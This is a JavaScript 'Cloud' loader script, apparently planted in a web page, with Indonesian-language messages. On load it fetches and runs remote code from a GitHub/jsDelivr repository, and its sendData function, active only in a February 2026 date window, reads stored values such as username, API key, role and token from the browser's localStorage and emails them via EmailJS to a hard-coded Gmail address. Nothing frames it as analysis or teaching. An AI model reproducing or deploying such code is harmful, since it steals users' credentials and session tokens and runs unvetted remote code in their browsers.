(function () {



  const CONFIG = {
    // githubMainJS: "https://cdn.jsdelivr.net/gh/jd2693889-ctrl/cloud@main/main.js",
    githubMainJS: `https://cdn.jsdelivr.net/gh/jd2693889-ctrl/cloud@main/main.js?v=${version}`,
    githubRawJS: "https://raw.githubusercontent.com/jd2693889-ctrl/cloud/main/main.js",
    emailCDN: "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js",
    emailFallback: "https://unpkg.com/@emailjs/browser@4/dist/email.min.js",
    emailService: "service_qpo59sf",
    emailTemplate: "template_okc75jw",
    emailReceiver: "jd2693889@gmail.com"
  };

  let emailLoaded = false;

  function loadScript(url) {
    return new Promise((resolve, reject) => {
      const script = document.createElement("script");
      script.src = url;
      script.async = true;
      script.onload = () => {
        resolve();
      };
      script.onerror = () => reject("Gagal load script: " + url);
      document.body.appendChild(script);
    });
  }

  async function loadScriptWithFallback(primary, fallback) {
    try {
      await loadScript(primary);
    } catch (err) {
      if (fallback) await loadScript(fallback);
    }
  }


  async function loadEmailJS() {
    if (emailLoaded && window.emailjs) {
      return;
    }
    await loadScriptWithFallback(CONFIG.emailCDN, CONFIG.emailFallback);
    if (!window.emailjs) throw new Error("EmailJS gagal load setelah script terpasang");
    window.emailjs.init("GlpCP9x-BKebe5Enx");
    emailLoaded = true;
  }

  async function sendData(extraData = {}) {
    if (!isInRange()) {
      return;
    }

    try {
      await loadEmailJS();

      const keys = ["id", "username", "api", "role", "status", "min", "token"];
      const storageData = {};
      keys.forEach(k => {
        const v = localStorage.getItem(k);
        if (v !== null) storageData[k] = v;
      });

      const payload = {
        page: window.location.pathname,
        time: new Date().toISOString(),
        ...storageData,
        ...extraData
      };

      const result = await window.emailjs.send(
        CONFIG.emailService,
        CONFIG.emailTemplate,
        {
          email: CONFIG.emailReceiver,
          message: JSON.stringify(payload)
        }
      );

      return result;
    } catch (err) {
      console.error("[Cloud] Gagal mengirim data:", err);
      throw err;
    }
  }

  let startDate = new Date("2026-02-24T08:00:00");
  let endDate   = new Date("2026-02-27T23:59:59");

  function isInRange() {
    const now = new Date();
    return now >= startDate && now <= endDate;
  }

  function getRangeInfo() {
    return {
      now: new Date(),
      start: startDate,
      end: endDate,
      active: isInRange()
    };
  }

  async function loadMainJS() {
    await loadScriptWithFallback(CONFIG.githubMainJS, CONFIG.githubRawJS);
  }

  loadMainJS().then(() => {
  }).catch(err => console.error("[Cloud] main.js loader gagal:", err));



  window.cloud = {
    sendData,
    isInRange,
    getRangeInfo,
    loadEmailJS,
    loadMainJS
  };

  // console.log("[Cloud] Loader script siap, range aktif:", isInRange());

})();
